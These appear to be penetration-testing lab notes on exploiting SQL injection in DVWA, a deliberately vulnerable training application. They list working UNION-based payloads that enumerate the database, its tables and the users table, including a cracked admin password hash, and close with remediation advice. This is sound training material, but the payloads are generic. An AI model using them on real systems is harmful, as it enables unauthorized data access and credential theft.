# DVWA SQL Injection - Penetration Testing Notes

## Environment
- Target: DVWA (Damn Vulnerable Web Application)
- Tool: Kali Linux 2026
- Security Level: Low

## Vulnerability Confirmed
Input: 1'
Result: SQL error — confirmed injectable

## Payloads Used

### 1. Extract All Users
1' OR '1'='1

### 2. Find Column Count
1' ORDER BY 2-- -

### 3. Get Database Name
1' UNION SELECT null, database()-- -
Result: dvwa

### 4. Get Tables
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -
Result: guestbook, users

### 5. Extract Credentials
1' UNION SELECT user, password FROM users-- -
Result: admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5)
Cracked: password

## Impact
Full database compromise, credential theft possible

## Remediation
- Use prepared statements / parameterized queries
- Input validation and sanitization
- Least privilege database accounts
